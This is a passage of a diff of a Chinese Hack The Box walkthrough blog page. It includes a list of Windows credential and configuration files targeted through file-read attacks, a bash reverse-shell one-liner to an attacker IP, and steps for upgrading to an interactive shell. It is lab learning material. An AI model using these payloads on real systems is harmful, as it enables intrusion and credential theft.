Settings/Administrator/NTUser.dat</span><br><span class="line">C:/apache/logs/access.log</span><br><span class="line">C:/apache/logs/error.log</span><br><span class="line">C:/apache/php/php.ini</span><br><span class="line">C:/boot.ini</span><br><span class="line">C:/inetpub/wwwroot/global.asa</span><br><span class="line">C:/MySQL/data/hostname.err</span><br><span class="line">C:/MySQL/data/mysql.err</span><br><span class="line">C:/MySQL/data/mysql.log</span><br><span class="line">C:/MySQL/my.cnf</span><br><span class="line">C:/MySQL/my.ini</span><br><span class="line">C:/php4/php.ini</span><br><span class="line">C:/php5/php.ini</span><br><span class="line">C:/php/php.ini</span><br><span class="line">C:/Program Files/Apache Group/Apache2/conf/httpd.conf</span><br><span class="line">C:/Program Files/Apache Group/Apache/conf/httpd.conf</span><br><span class="line">C:/Program Files/Apache Group/Apache/logs/access.log</span><br><span class="line">C:/Program Files/Apache Group/Apache/logs/error.log</span><br><span class="line">C:/Program Files/FileZilla Server/FileZilla Server.xml</span><br><span class="line">C:/Program Files/MySQL/data/hostname.err</span><br><span class="line">C:/Program Files/MySQL/data/mysql-bin.log</span><br><span class="line">C:/Program Files/MySQL/data/mysql.err</span><br><span class="line">C:/Program Files/MySQL/data/mysql.log</span><br><span class="line">C:/Program Files/MySQL/my.ini</span><br><span class="line">C:/Program Files/MySQL/my.cnf</span><br><span class="line">C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err</span><br><span class="line">C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log</span><br><span class="line">C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err</span><br><span class="line">C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log</span><br><span class="line">C:/Program Files/MySQL/MySQL Server 5.0/my.cnf</span><br><span class="line">C:/Program Files/MySQL/MySQL Server 5.0/my.ini</span><br><span class="line">C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf</span><br><span class="line">C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf</span><br><span class="line">C:/Program Files (x86)/Apache Group/Apache/conf/access.log</span><br><span class="line">C:/Program Files (x86)/Apache Group/Apache/conf/error.log</span><br><span class="line">C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml</span><br><span class="line">C:/Program Files (x86)/xampp/apache/conf/httpd.conf</span><br><span class="line">C:/WINDOWS/php.ini</span><br><span class="line">C:/WINDOWS/Repair/SAM</span><br><span class="line">C:/Windows/repair/system</span><br><span class="line">C:/Windows/repair/software</span><br><span class="line">C:/Windows/repair/security</span><br><span class="line">C:/WINDOWS/System32/drivers/etc/hosts</span><br><span class="line">C:/Windows/win.ini</span><br><span class="line">C:/WINNT/php.ini</span><br><span class="line">C:/WINNT/win.ini</span><br><span class="line">C:/xampp/apache/bin/php.ini</span><br><span class="line">C:/xampp/apache/logs/access.log</span><br><span class="line">C:/xampp/apache/logs/error.log</span><br><span class="line">C:/Windows/Panther/Unattend/Unattended.xml</span><br><span class="line">C:/Windows/Panther/Unattended.xml</span><br><span class="line">C:/Windows/debug/NetSetup.log</span><br><span class="line">C:/Windows/system32/config/AppEvent.Evt</span><br><span class="line">C:/Windows/system32/config/SecEvent.Evt</span><br><span class="line">C:/Windows/system32/config/default.sav</span><br><span class="line">C:/Windows/system32/config/security.sav</span><br><span class="line">C:/Windows/system32/config/software.sav</span><br><span class="line">C:/Windows/system32/config/system.sav</span><br><span class="line">C:/Windows/system32/config/regback/default</span><br><span class="line">C:/Windows/system32/config/regback/sam</span><br><span class="line">C:/Windows/system32/config/regback/security</span><br><span class="line">C:/Windows/system32/config/regback/system</span><br><span class="line">C:/Windows/system32/config/regback/software</span><br><span class="line">C:/Program Files/MySQL/MySQL Server 5.1/my.ini</span><br><span class="line">C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml</span><br><span class="line">C:/Windows/System32/inetsrv/config/applicationHost.config</span><br><span class="line">C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Administrator/NTUser.dat</span><br><span class="line">C:/Documents and Settings/Administrator/NTUser.dat</span><br><span class="line">C:/apache/logs/access.log</span><br><span class="line">C:/apache/logs/error.log</span><br><span class="line">C:/apache/php/php.ini</span><br><span class="line">C:/boot.ini</span><br><span class="line">C:/inetpub/wwwroot/global.asa</span><br><span class="line">C:/MySQL/data/hostname.err</span><br><span class="line">C:/MySQL/data/mysql.err</span><br><span class="line">C:/MySQL/data/mysql.log</span><br><span class="line">C:/MySQL/my.cnf</span><br><span class="line">C:/MySQL/my.ini</span><br><span class="line">C:/php4/php.ini</span><br><span class="line">C:/php5/php.ini</span><br><span class="line">C:/php/php.ini</span><br><span class="line">C:/Program Files/Apache Group/Apache2/conf/httpd.conf</span><br><span class="line">C:/Program Files/Apache Group/Apache/conf/httpd.conf</span><br><span class="line">C:/Program Files/Apache Group/Apache/logs/access.log</span><br><span class="line">C:/Program Files/Apache Group/Apache/logs/error.log</span><br><span class="line">C:/Program Files/FileZilla Server/FileZilla Server.xml</span><br><span class="line">C:/Program Files/MySQL/data/hostname.err</span><br><span class="line">C:/Program Files/MySQL/data/mysql-bin.log</span><br><span class="line">C:/Program Files/MySQL/data/mysql.err</span><br><span class="line">C:/Program Files/MySQL/data/mysql.log</span><br><span class="line">C:/Program Files/MySQL/my.ini</span><br><span class="line">C:/Program Files/MySQL/my.cnf</span><br><span class="line">C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err</span><br><span class="line">C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log</span><br><span class="line">C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err</span><br><span class="line">C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log</span><br><span class="line">C:/Program Files/MySQL/MySQL Server 5.0/my.cnf</span><br><span class="line">C:/Program Files/MySQL/MySQL Server 5.0/my.ini</span><br><span class="line">C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf</span><br><span class="line">C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf</span><br><span class="line">C:/Program Files (x86)/Apache Group/Apache/conf/access.log</span><br><span class="line">C:/Program Files (x86)/Apache Group/Apache/conf/error.log</span><br><span class="line">C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml</span><br><span class="line">C:/Program Files (x86)/xampp/apache/conf/httpd.conf</span><br><span class="line">C:/WINDOWS/php.ini</span><br><span class="line">C:/WINDOWS/Repair/SAM</span><br><span class="line">C:/Windows/repair/system</span><br><span class="line">C:/Windows/repair/software</span><br><span class="line">C:/Windows/repair/security</span><br><span class="line">C:/WINDOWS/System32/drivers/etc/hosts</span><br><span class="line">C:/Windows/win.ini</span><br><span class="line">C:/WINNT/php.ini</span><br><span class="line">C:/WINNT/win.ini</span><br><span class="line">C:/xampp/apache/bin/php.ini</span><br><span class="line">C:/xampp/apache/logs/access.log</span><br><span class="line">C:/xampp/apache/logs/error.log</span><br><span class="line">C:/Windows/Panther/Unattend/Unattended.xml</span><br><span class="line">C:/Windows/Panther/Unattended.xml</span><br><span class="line">C:/Windows/debug/NetSetup.log</span><br><span class="line">C:/Windows/system32/config/AppEvent.Evt</span><br><span class="line">C:/Windows/system32/config/SecEvent.Evt</span><br><span class="line">C:/Windows/system32/config/default.sav</span><br><span class="line">C:/Windows/system32/config/security.sav</span><br><span class="line">C:/Windows/system32/config/software.sav</span><br><span class="line">C:/Windows/system32/config/system.sav</span><br><span class="line">C:/Windows/system32/config/regback/default</span><br><span class="line">C:/Windows/system32/config/regback/sam</span><br><span class="line">C:/Windows/system32/config/regback/security</span><br><span class="line">C:/Windows/system32/config/regback/system</span><br><span class="line">C:/Windows/system32/config/regback/software</span><br><span class="line">C:/Program Files/MySQL/MySQL Server 5.1/my.ini</span><br><span class="line">C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml</span><br><span class="line">C:/Windows/System32/inetsrv/config/applicationHost.config</span><br><span class="line">C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191224143221.png" alt></p>
 <p>接下来需要获取root权限, 先离开ftp看看其他的端口, </p>
-<h3 id="个人信息"><a href="#个人信息" class="headerlink" title="个人信息"></a>个人信息</h3><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ip</span><br><span class="line">10.10.14.10</span><br><span class="line"># bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.14.10/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
-<h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h3><h4 id="半交互式"><a href="#半交互式" class="headerlink" title="半交互式"></a>半交互式</h4><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># python pty</span><br><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure></p>
+<h3 id="个人信息"><a href="#个人信息" class="headerlink" title="个人信息"></a>个人信息</h3><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ip</span><br><span class="line">10.10.14.10</span><br><span class="line"># bash</span><br><span class="line">bash -i >& /dev/tcp/10.10.14.10/2333 0>&1</span><br></pre></td></tr></tbody></table></figure><p></p>
+<h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h3><h4 id="半交互式"><a href="#半交互式" class="headerlink" title="半交互式"></a>半交互式</h4><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># python pty</span><br><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>此时可以实现简单的交互, 处于半交互状态, 但是不能用vim这种命令</p>
 <h4 id="交互式"><a href="#交互式" class="headerlink" title="交互式"></a>交互式</h4><p>首先将shell放到后台</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctrl + z</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctrl + z</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>然后执行</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>接着使用fg将shell返回前台</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fg</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fg</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>现在的shell看起来会比较奇怪, 使用reset</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>再导入如下配置即可</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export SHELL=bash</span><br><span class="line">export TERM=xterm256-color</span><br><span class="line">stty rows 24 columns 80</span><br></pre></td></tr></table></figure></p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export SHELL=bash</span><br><span class="line">export TERM=xterm256-color</span><br><span class="line">stty rows 24 columns 80</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>吐槽一下为啥进入交互式后shell特别卡—-</p>
 <h3 id><a href="#" class="headerlink" title></a></h3><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
 <li><a href="https://bbs.ichunqiu.com/thread-54982-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-54982-1-1.html</a></li>
 <li></li>
 </ol>
-
+<p><br></p><blockquote class="colorquote info"><p>本文作者：cjm00n<br>本文地址： <a href="https://cjm00n.top/2019/11/24/HTB-Hack之旅/">https://cjm00n.top/2019/11/24/HTB-Hack之旅/</a> <br>版权声明：除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。</p>
+</blockquote><p></p>
+</body></html>
     
     </div>
     
@@ -355,12 +345,12 @@
     <div class="columns is-mobile is-multiline article-nav">
         <span class="column is-12-mobile is-half-desktop  article-nav-prev">
             
-            <a href="/2020/02/14/BuuCTF刷题记录/">BuuCTF刷题记录</a>
+            <a href="/2020/02/14/BuuCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">BuuCTF刷题记录</a>
             
         </span>
         <span class="column is-12-mobile is-half-desktop  article-nav-next">
             
-            <a href="/2019/11/24/php和mysql开发笔记/">php和mysql开发笔记</a>
+            <a href="/2019/11/24/php%E5%92%8Cmysql%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/">php和mysql开发笔记</a>
             
         </span>
     </div>
@@ -375,7 +365,7 @@
     
 <script>
     var disqus_config = function () {
-        this.page.url = 'https://cjm00n.top/2019/11/24/HTB-Hack之旅/';
+        this.page.url = 'https://cjm00n.top/2019/11/24/HTB-Hack%E4%B9%8B%E6%97%85/';
         this.page.identifier = '2019/11/24/HTB-Hack之旅/';
         
         this.language = 'en';
@@ -391,7 +381,7 @@
 
 <div id="disqus_thread">
     
-    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
 </div>
 </div>
 
@@ -401,24 +391,20 @@
     <div class="container">
         <div class="columns content">
             <div class="column is-narrow has-text-centered">
-                &copy; 2020 cjM00N&nbsp;
-                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+                <i class="fas fa-moon"></i> 2020 cjM00N&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+                        
             </div>
             <div class="column is-hidden-mobile"></div>
-
-            
-            <div class="column is-narrow">
-                <div class="columns is-mobile is-multiline is-centered">
-                
-                    
-                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/cjm00n/">
-                    
-                    GitHub
-                    
-                </a>
-                
-                </div>
+            <div class="column is-narrow has-text-centered">
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+                </script>
+            <span id="busuanzi_container_page_pv"> 
+                <i class="fas fa-eye"></i> clicked: <a href="#"><span id="busuanzi_value_page_pv"></span></a> times
+              </span>
             </div>
+            
             
             
         </div>
@@ -430,7 +416,7 @@
 <!-- test if the browser is outdated -->
 <div id="outdated">
     <h6>Your browser is out-of-date!</h6>
-    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/" target="_blank" rel="noopener">Update my browser now </a></p>
     <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
 </div>
 <script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
@@ -449,52 +435,13 @@
     window.FontAwesomeConfig = {
         searchPseudoElements: true
     }
-    moment.locale("en-AU");
+    // moment.locale("en-AU");
+    moment.locale("zh-cn");
 </script>
 
 
     
     
-<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
-<script>
-    MathJax.Hub.Config({
-        "HTML-CSS": {
-            matchFontHeight: false
-        },
-        SVG: {
-            matchFontHeight: false
-        },
-        CommonHTML: {
-            matchFontHeight: false
-        },
-        tex2jax: {
-            inlineMath: [
-                ['$','$'],
-                ['\\(','\\)']
-            ]
-        }
-    });
-</script>
-
-    
-    
-    
-    
-<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
-<script>
-    (function ($) {
-        $(document).ready(function () {
-            if (typeof($.fn.lightGallery) === 'function') {
-                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
-            }
-            if (typeof($.fn.justifiedGallery) === 'function') {
-                $('.justified-gallery').justifiedGallery();
-            }
-        });
-    })(jQuery);
-</script>
-
     
     
     <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
@@ -566,14 +513,16 @@
     
 
 
+
 <script src="/js/script.js"></script>
+
 
     
     <div class="searchbox ins-search">
     <div class="searchbox-mask"></div>
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something...">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -596,7 +545,9 @@
         window.INSIGHT_CONFIG = INSIGHT_CONFIG;
     })(window);
 </script>
+
 <script src="/js/insight.js"></script>
+
     
 </body>
 </html>
